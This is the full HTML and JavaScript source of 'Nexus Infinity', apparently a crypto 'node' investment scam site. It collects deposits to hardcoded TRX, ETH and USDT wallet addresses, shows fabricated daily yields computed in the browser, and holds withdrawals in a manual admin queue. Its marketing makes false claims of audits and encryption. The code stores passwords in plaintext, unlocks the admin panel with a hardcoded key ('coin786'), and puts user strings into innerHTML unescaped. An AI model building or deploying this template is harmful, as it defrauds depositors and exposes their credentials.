<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Ultimate Sovereign Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --n-pink: #ff00ff; --n-blue: #00d4ff; --bg: #07090c; }
        body { background: var(--bg); color: #f1f5f9; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(40px); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 30px; }
        .btn-master { background: linear-gradient(135deg, #ff00ff, #00d4ff); font-weight: 800; padding: 18px; border-radius: 20px; transition: 0.3s; text-transform: uppercase; width: 100%; box-shadow: 0 10px 25px rgba(255, 0, 255, 0.2); border: none; color: white; cursor: pointer; }
        .input-hub { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.07); border-radius: 18px; padding: 16px; color: white; width: 100%; outline: none; }
        
        .nav-item { color: #475569; transition: 0.3s; text-align: center; flex: 1; cursor: pointer; }
        .nav-active { color: #fff; transform: translateY(-3px); }
        .nav-active i { color: var(--n-pink); filter: drop-shadow(0 0 8px var(--n-pink)); }
        
        .broadcast-bar { background: rgba(0, 0, 0, 0.8); border-bottom: 1px solid rgba(255, 255, 255, 0.05); height: 35px; display: flex; align-items: center; position: fixed; top: 0; width: 100%; z-index: 100; overflow: hidden; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .broadcast-text { white-space: nowrap; animation: marquee 25s linear infinite; font-size: 10px; font-weight: 800; text-transform: uppercase; color: var(--n-blue); letter-spacing: 2px; }
        
        .method-card { background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 15px; cursor: pointer; transition: 0.3s; }
        .method-active { border-color: var(--n-pink); background: rgba(255, 0, 255, 0.05); }
        .faq-item { border-bottom: 1px solid rgba(255, 255, 255, 0.05); padding: 15px 0; }
        .hidden { display: none !important; }
    </style>
</head>
<body class="selection:bg-pink-500/30">

    <div class="broadcast-bar"><div id="broadcast-msg" class="broadcast-text italic">GLOBAL NETWORK ACTIVE: Protocol V3.1 Secure... All withdrawals audited via Proof-of-Stake... Welcome to the Nexus...</div></div>

    <div id="splash" class="fixed inset-0 bg-[#07090c] z-[9999] flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-gradient-to-tr from-pink-600 to-blue-600 rounded-[2.5rem] flex items-center justify-center text-5xl font-black italic shadow-[0_0_60px_rgba(255,0,255,0.2)] animate-pulse">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-8 text-[9px] tracking-[0.8em] text-white/30 uppercase">Sovereign Terminal</h1>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 pt-16 hidden">
        <div class="max-w-md w-full glass p-10 space-y-8 border-t-4 border-pink-600">
            <div id="login-ui" class="space-y-6">
                <div class="text-center"><h2 class="text-3xl font-black italic tracking-tighter uppercase">Nexus <span class="text-pink-500 text-lg block tracking-[5px]">Access Hub</span></h2><p class="text-[9px] text-zinc-500 font-bold uppercase mt-4">Authorized Personnel Only</p></div>
                <input type="text" id="l-user" placeholder="Protocol ID" class="input-hub">
                <input type="password" id="l-pass" placeholder="Security Key" class="input-hub">
                <button onclick="handleLogin()" class="btn-master">Authorize Identity</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] text-blue-400 font-black uppercase cursor-pointer hover:text-white">Initialize New Protocol</p>
            </div>
            <div id="signup-ui" class="space-y-6 hidden">
                <div class="text-center"><h2 class="text-3xl font-black italic tracking-tighter uppercase">Protocol <span class="text-pink-500 text-lg block tracking-[5px]">Registration</span></h2></div>
                <input type="text" id="s-user" placeholder="New Username" class="input-hub">
                <input type="password" id="s-pass" placeholder="Access Password" class="input-hub">
                <input type="text" id="s-ref" placeholder="Referral Code (Optional)" class="input-hub">
                <button onclick="handleSignup()" class="btn-master">Activate Identity</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer hover:text-white">Return to Login</p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-32 pt-14">
        <header class="p-6 flex justify-between items-center sticky top-8 bg-[#07090c]/80 backdrop-blur-2xl z-50 border-b border-white/5">
            <div class="flex items-center gap-4">
                <div id="admin-trigger" class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center font-black border border-white/10 italic text-xl text-pink-500">N</div>
                <div><p id="nav-user" class="text-sm font-black uppercase text-white">...</p><p class="text-[8px] text-green-500 font-black uppercase tracking-widest">● Verified Entity</p></div>
            </div>
            <div class="flex items-center gap-5">
                <a href="https://t.me/NexusUpdates" target="_blank" class="text-blue-400 text-2xl"><i class="fa-brands fa-telegram"></i></a>
                <button onclick="logout()" class="text-zinc-600 hover:text-red-500"><i class="fa-solid fa-power-off text-xl"></i></button>
            </div>
        </header>

        <main id="page-home" class="p-6 space-y-6">
            <div class="glass p-10 bg-gradient-to-br from-indigo-500/10 via-transparent to-transparent">
                <p class="text-[9px] font-black text-zinc-500 uppercase tracking-[3px] mb-2">Institutional Balance</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-10 flex justify-between items-end border-t border-white/10 pt-6">
                    <div><p class="text-[8px] text-zinc-500 uppercase font-black mb-1">Yield Generated</p><p id="profit-txt" class="text-xl font-black text-pink-500">+$0.00</p></div>
                    <div class="text-right"><p class="text-[8px] text-zinc-500 uppercase font-black mb-1">Ref ID</p><p id="my-ref" class="text-xs font-black text-blue-400 uppercase">...</p></div>
                </div>
            </div>
            <h3 class="text-[10px] font-black uppercase text-zinc-600 tracking-[4px] ml-2">Active Infrastructure</h3>
            <div id="active-nodes-list" class="grid gap-4"></div>
        </main>

        <main id="page-market" class="p-6 space-y-6 hidden">
            <h3 class="text-xl font-black italic uppercase text-pink-500 tracking-tighter">Asset Market</h3>
            <div id="market-list" class="grid gap-4"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-8 hidden">
            <div class="glass p-8 space-y-8">
                <h3 class="text-lg font-black uppercase text-blue-400 italic">Inject Assets</h3>
                <div class="grid gap-3">
                    <div onclick="selectMethod('TRX','TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76')" id="m-trx" class="method-card flex justify-between items-center">
                        <div><p class="text-xs font-black uppercase">Trust Wallet (TRX)</p><p class="text-[8px] text-zinc-500 font-mono mt-1">TK1ZYaXdf...GoVx76</p></div>
                        <i class="fa-solid fa-gem text-blue-500"></i>
                    </div>
                    <div onclick="selectMethod('ETH','0xD9359EADE5F5bACA51fb7da043767Bc0685bC355')" id="m-eth" class="method-card flex justify-between items-center">
                        <div><p class="text-xs font-black uppercase">Metamask (ETH)</p><p class="text-[8px] text-zinc-500 font-mono mt-1">0xD9359E...BC355</p></div>
                        <i class="fa-brands fa-ethereum text-indigo-500"></i>
                    </div>
                    <div onclick="selectMethod('USDT','TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ')" id="m-usdt" class="method-card flex justify-between items-center">
                        <div><p class="text-xs font-black uppercase">Binance (USDT TRC20)</p><p class="text-[8px] text-zinc-500 font-mono mt-1">TAvfQQ...KsJ</p></div>
                        <i class="fa-solid fa-circle-dollar-to-slot text-green-500"></i>
                    </div>
                </div>

                <div id="dep-form" class="hidden space-y-4 pt-6 border-t border-white/5">
                    <p class="text-center text-[10px] text-blue-400 font-black uppercase italic animate-pulse">Address copied! Proceed to payment.</p>
                    <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="input-hub">
                    <input type="text" id="dep-tid" placeholder="Transaction Hash / TID" class="input-hub">
                    <label class="block text-[8px] font-black uppercase text-zinc-500 mb-[-10px] ml-2">Attach Payment Proof</label>
                    <input type="file" id="dep-proof" accept="image/*" class="text-[10px] file:bg-zinc-800 file:border-0 file:rounded-full file:px-4 file:py-2 file:text-white">
                    <img id="preview-img" class="w-full h-44 object-cover rounded-3xl hidden border-2 border-white/10">
                    <button onclick="submitDep()" class="btn-master">Validate Protocol</button>
                </div>
            </div>

            <div class="glass p-8 space-y-6">
                <h3 class="text-lg font-black uppercase text-pink-500 italic">Withdraw Payout</h3>
                <div class="space-y-4">
                    <div class="flex justify-between text-[9px] font-black uppercase"><span class="text-zinc-500">Withdrawal Funds</span><span id="with-avail" class="text-white">$0.00</span></div>
                    <input type="text" id="w-addr" placeholder="Destination Wallet Address" class="input-hub">
                    <select id="w-net" class="input-hub bg-slate-900 border-none outline-none appearance-none">
                        <option value="USDT-TRC20">USDT (TRC20 Protocol)</option>
                        <option value="ETH-ERC20">ETH (ERC20 Protocol)</option>
                        <option value="TRX-NATIVE">TRON (Native Network)</option>
                    </select>
                    <input type="number" id="w-amt" placeholder="Amount to Withdraw ($)" class="input-hub">
                    <button onclick="submitWith()" class="btn-master !bg-zinc-900 !shadow-none">Initialize Transfer</button>
                    <p class="text-[8px] text-zinc-600 text-center font-bold uppercase tracking-widest leading-loose">Internal Security Check Applied<br>Min Withdrawal: $10.00</p>
                </div>
            </div>
        </main>

        <main id="page-info" class="p-6 space-y-6 hidden pb-24">
            <div class="glass p-8 space-y-4">
                <h3 class="text-xl font-black uppercase italic text-blue-400">About Infrastructure</h3>
                <p class="text-[11px] leading-relaxed text-zinc-400">Nexus Infinity is a premier global decentralized infrastructure provider. Our system leverages advanced node clustering to maximize yield efficiency across multi-chain ecosystems. Trusted by elite partners since 2024.</p>
            </div>
            <div class="glass p-8">
                <h3 class="text-lg font-black uppercase italic text-pink-500 mb-6">Common Protocols (FAQ)</h3>
                <div class="space-y-4 text-[11px]">
                    <div class="faq-item"><b>Q: Settlement timeframe?</b><p class="text-zinc-500 mt-1">A: All yields are credited every 24 hours. Withdrawals process within 24 business hours.</p></div>
                    <div class="faq-item"><b>Q: Security protocols?</b><p class="text-zinc-500 mt-1">A: We employ end-to-end encryption. No private keys are ever stored on our public nodes.</p></div>
                    <div class="faq-item"><b>Q: Maintenance fee?</b><p class="text-zinc-500 mt-1">A: A standard 2% operational fee is applied to all outgoing payouts.</p></div>
                </div>
            </div>
            <div class="glass p-8 border-l-4 border-red-500/30">
                <h3 class="text-[10px] font-black uppercase text-zinc-500 mb-3">Privacy & Compliance</h3>
                <p class="text-[10px] text-zinc-600 italic">User data is strictly encrypted. By utilizing the Nexus protocol, you acknowledge the decentralized nature of digital assets. All transactions are final.</p>
            </div>
            <button onclick="clearMyHistory()" class="w-full text-red-500 text-[9px] font-black uppercase tracking-[3px] opacity-40">Wipe Local Log Data</button>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-6 bg-[#07090c]/95 backdrop-blur-3xl border-t border-white/5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-microchip text-xl"></i><p class="text-[8px] font-black uppercase mt-1">Core</p></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-cube text-xl"></i><p class="text-[8px] font-black uppercase mt-1">Nodes</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-wallet text-xl"></i><p class="text-[8px] font-black uppercase mt-1">Vault</p></div>
            <div onclick="switchPage('info')" class="nav-item"><i class="fa-solid fa-info-circle text-xl"></i><p class="text-[8px] font-black uppercase mt-1">Info</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#07090c] z-[10000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 border-b border-white/10 pb-6">
            <h2 class="text-2xl font-black italic text-pink-500">MASTER COMMAND</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button>
        </div>
        <div class="space-y-8">
            <div class="glass p-8 space-y-4">
                <h4 class="text-[10px] font-black uppercase text-zinc-500 tracking-widest">Global Announcement Sync</h4>
                <input type="text" id="adm-broadcast" placeholder="New Broadcast Message..." class="input-hub">
                <button onclick="updateBroadcast()" class="btn-master !py-3">Distribute</button>
            </div>
            <h3 class="text-xs font-black uppercase text-zinc-500 ml-2">Request Queue</h3>
            <div id="admin-requests" class="space-y-6"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const marketNodes = Array.from({length: 22}, (_, i) => ({
            id: i+1, title: i < 11 ? `Protocol S-${i+1}` : `Elite Apex X-${i-10}`, price: i < 11 ? (i+1)*25 : (i-10)*600, daily: i < 11 ? (i+1)*3.2 : (i-10)*110, days: i < 11 ? 30 : 60, img: `https://picsum.photos/seed/node${i+100}/400/200`
        }));

        let activeMethod = '';
        window.selectMethod = (type, addr) => {
            activeMethod = type;
            document.querySelectorAll('.method-card').forEach(c => c.classList.remove('method-active'));
            document.getElementById('m-'+type.toLowerCase()).classList.add('method-active');
            document.getElementById('dep-form').classList.remove('hidden');
            navigator.clipboard.writeText(addr);
        };

        window.onload = () => {
            renderMarket();
            onValue(ref(db, 'system/broadcast'), (s) => { if(s.val()) document.getElementById('broadcast-msg').innerText = s.val(); });
            setTimeout(() => { document.getElementById('splash').style.display = 'none'; const u = localStorage.getItem('nexus_user'); if(u) showDashboard(u); else document.getElementById('auth-section').classList.remove('hidden'); }, 2500);
        };

        function renderMarket() {
            document.getElementById('market-list').innerHTML = marketNodes.map(n => `
                <div class="glass overflow-hidden"><img src="${n.img}" class="w-full h-32 object-cover opacity-30"><div class="p-6 flex justify-between items-center"><div><h4 class="font-black italic uppercase text-xs">${n.title}</h4><p class="text-[9px] font-bold text-green-400 mt-1">$${n.daily.toFixed(2)}/24H</p></div><div class="text-right"><p class="text-lg font-black text-white">$${n.price}</p><button onclick="buyNode(${n.id})" class="mt-2 bg-white text-black px-5 py-1.5 rounded-xl text-[9px] font-black uppercase">Initialize</button></div></div></div>`).join('');
        }

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user'), node = marketNodes.find(x => x.id === id), s = await get(ref(db, `users/${user}`));
            if((s.val().balance || 0) < node.price) return alert("System Warning: Insufficient Portfolio Equity.");
            const now = Date.now();
            await update(ref(db, `users/${user}`), { balance: s.val().balance - node.price });
            await set(push(ref(db, `users/${user}/nodes`)), { ...node, startTime: now, expires: now + (node.days * 86400000), lastClaim: now });
            alert("Infrastructure Successfully Injected!"); switchPage('home');
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid; document.getElementById('my-ref').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                document.getElementById('with-avail').innerText = '$' + (d.profit || 0).toFixed(2);

                const activeNodes = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = activeNodes.map(([k, n]) => {
                    if(Date.now() - n.lastClaim >= 86400000) {
                        update(ref(db, `users/${uid}`), { profit: (d.profit || 0) + n.daily });
                        update(ref(db, `users/${uid}/nodes/${k}`), { lastClaim: Date.now() });
                    }
                    return `<div class="glass p-6 border-l-4 border-blue-500 flex justify-between items-center"><div><p class="text-[10px] font-black uppercase">${n.title}</p><p class="text-[10px] font-black uppercase">${n.title}</p><p class="text-[8px] font-bold text-zinc-500">Yield: $${n.daily.toFixed(2)}</p></div><p class="text-[8px] font-black text-blue-400 animate-pulse uppercase">Syncing...</p></div>`;
                }).join('') || '<p class="text-center opacity-20 py-10 uppercase font-black text-[10px]">Infrastructure Offline</p>';
            });
        }

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user'), amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value, proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("Incomplete Protocol Submission.");
            const hKey = push(ref(db, `users/${user}/history`)).key;
            const ent = { user, amount: amt, tid, proof, method: activeMethod, status: 'Pending', date: new Date().toLocaleString(), type: 'Deposit', hKey };
            await set(ref(db, `users/${user}/history/${hKey}`), ent); await set(ref(db, 'admin/requests/' + hKey), ent);
            alert("Deposit Request Queued for Audit.");
        };

        window.submitWith = async () => {
            const u = localStorage.getItem('nexus_user'), amt = parseFloat(document.getElementById('w-amt').value), adr = document.getElementById('w-addr').value, net = document.getElementById('w-net').value, s = await get(ref(db, `users/${u}`));
            if(!amt || !adr || amt < 10) return alert("Minimum Withdrawal $10.00 Required.");
            if((s.val().profit || 0) < amt) return alert("Insufficient Yield Balance.");
            const hKey = push(ref(db, `users/${u}/history`)).key;
            const ent = { user: u, amount: amt, address: adr, network: net, status: 'Pending', date: new Date().toLocaleString(), type: 'Withdrawal', hKey };
            await update(ref(db, `users/${u}`), { profit: s.val().profit - amt });
            await set(ref(db, `users/${u}/history/${hKey}`), ent); await set(ref(db, 'admin/requests/' + hKey), ent);
            alert("Withdrawal Protocol Initialized.");
        };

        window.manage = async (id, user, amt, hKey, action, type) => {
            if(action === 'approve') {
                if(type === 'Deposit') {
                    const s = await get(ref(db, `users/${user}`));
                    await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
                }
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Approved' });
            } else {
                if(type === 'Withdrawal') {
                    const s = await get(ref(db, `users/${user}`));
                    await update(ref(db, `users/${user}`), { profit: (s.val().profit || 0) + parseFloat(amt) });
                }
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Rejected' });
            }
            await remove(ref(db, 'admin/requests/' + id));
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass p-6 space-y-4 border border-white/10">
                        <div class="flex justify-between items-center text-[9px] font-black uppercase"><span class="text-pink-500">${l.type}</span><span class="text-zinc-600">${l.date}</span></div>
                        <p class="text-[10px]">USER: <b>${l.user}</b> | AMT: <b class="text-green-500">$${l.amount}</b></p>
                        ${l.proof ? `<img src="${l.proof}" class="w-full h-44 object-cover rounded-2xl border border-white/5" onclick="window.open(this.src)">` : `<p class="text-[9px] bg-black/40 p-3 rounded-xl break-all">TARGET ADDR: ${l.address}<br>NET: ${l.network}</p>`}
                        <div class="grid grid-cols-2 gap-4"><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','approve','${l.type}')" class="bg-green-500/20 text-green-500 py-4 rounded-xl text-[10px] font-black uppercase">Approve</button><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','reject','${l.type}')" class="bg-red-500/20 text-red-500 py-4 rounded-xl text-[10px] font-black uppercase">Deny</button></div>
                    </div>`).join('') : '<p class="text-center opacity-30 py-20 uppercase font-black text-[10px]">Queue Clear</p>';
            });
        }

        document.getElementById('dep-proof').onchange = (e) => { const r = new FileReader(); r.readAsDataURL(e.target.files[0]); r.onload = () => { document.getElementById('preview-img').src = r.result; document.getElementById('preview-img').classList.remove('hidden'); }; };
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Security Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        window.switchPage = (p) => { ['home','market','vault','info'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim(), s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Protocol Denied: Invalid Credentials."); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(), r = document.getElementById('s-ref').value.trim(); if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, referredBy: r }); alert("Identity Activated."); toggleAuth(false); } };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.updateBroadcast = async () => { await set(ref(db, 'system/broadcast'), document.getElementById('adm-broadcast').value); alert("Sync Complete."); };
        window.clearMyHistory = async () => { if(confirm("Permanently wipe protocol history?")) await remove(ref(db, `users/${localStorage.getItem('nexus_user')}/history`)); };
    </script>
</body>
</html>
